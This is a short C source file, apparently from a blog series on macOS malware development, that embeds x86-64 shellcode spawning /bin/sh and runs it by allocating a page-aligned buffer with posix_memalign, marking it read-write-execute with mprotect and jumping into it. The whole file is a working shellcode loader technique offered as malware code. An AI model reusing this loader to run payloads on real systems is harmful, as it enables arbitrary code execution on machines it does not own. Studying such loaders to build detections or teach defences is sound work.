/*
* hack3.c
* run via posix_memalign + mprotect
* author: @cocomelonc
* https://cocomelonc.github.io/macos/2025/08/02/malware-mac-7.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned char code[] =
  /* 0000 */ "\x31\xf6"                                 /* xor     esi, esi                */
  /* 0002 */ "\xf7\xe6"                                 /* mul     esi                     */
  /* 0004 */ "\x0f\xba\xe8\x19"                         /* bts     eax, 0x19               */
  /* 0008 */ "\xb0\x3b"                                 /* mov     al, 0x3b                */
  /* 000A */ "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* movabs  rbx, 0x68732f2f6e69622f */
  /* 0014 */ "\x52"                                     /* push    rdx                     */
  /* 0015 */ "\x53"                                     /* push    rbx                     */
  /* 0016 */ "\x54"                                     /* push    rsp                     */
  /* 0017 */ "\x5f"                                     /* pop     rdi                     */
  /* 0018 */ "\x0f\x05"                                 /* syscall                         */;


int main() {
  size_t pagesize = sysconf(_SC_PAGESIZE);
  void *buf = NULL;

  // allocate page-aligned buffer
  if (posix_memalign(&buf, pagesize, pagesize) != 0) {
    perror("posix_memalign");
    return 1;
  }

  memcpy(buf, code, sizeof(code));

  // mark buffer as executable
  if (mprotect(buf, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
    perror("mprotect");
    return 1;
  }

  // run shellcode
  ((void(*)())buf)();

  // free(buf); // optional

  return 0;
}
